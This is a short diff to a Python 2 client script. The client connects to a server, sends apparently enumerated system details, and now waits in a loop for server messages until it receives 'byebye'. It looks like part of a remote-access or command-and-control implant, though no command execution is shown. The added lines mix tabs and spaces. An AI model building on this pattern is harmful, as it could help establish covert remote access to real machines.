@@ -86,9 +86,12 @@ def main():
 	sock = CrispyTCPClient().connect(host, port)
 	print "[+] Connected successfully"
 	sock.send(json.dumps(enum()))
+	data = ""
 	while True:
-	    time.sleep(120)
-    except KeyboardInterrupt: ###send "kill" msg to srv so srv can remove from session list?
+	    data = sock.recv(1024)
+            if data == "byebye":
+                break
+    except KeyboardInterrupt: 
 	pass
     except Exception as e:
 	print "[!] Error connecting to {}:{} because of {}".format(host, port, e)
